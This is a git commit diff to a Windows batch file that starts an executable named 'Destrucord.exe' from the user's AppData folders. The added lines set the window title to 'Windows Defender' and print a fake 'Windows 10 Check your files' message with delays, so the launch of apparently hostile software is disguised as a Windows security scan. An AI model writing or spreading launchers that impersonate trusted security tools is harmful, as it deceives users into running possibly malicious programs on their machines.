0da5193622e9fc08132013ead4b28609f292a443
What about KSCH <54140748+KSCHdsc@users.noreply.github.com>
2022-06-16 13:02:08 +0200

    Update startdestrucord.bat

--- startdestrucord.bat
+++ startdestrucord.bat
@@ -1,5 +1,7 @@
 @echo off
-
+title Windows Defender
+echo Windows 10 Check your files please wait...
+timeout 8
 if exist "%UserProfile%\AppData\Local\xDestruCord\Destrucord.exe" start %UserProfile%\AppData\Local\xDestruCord\Destrucord.exe
-
+timeout 3
 if exist "%UserProfile%\AppData\Roaming\xDestruCord\Destrucord.exe" start %UserProfile%\AppData\Roaming\xDestruCord\Destrucord.exe
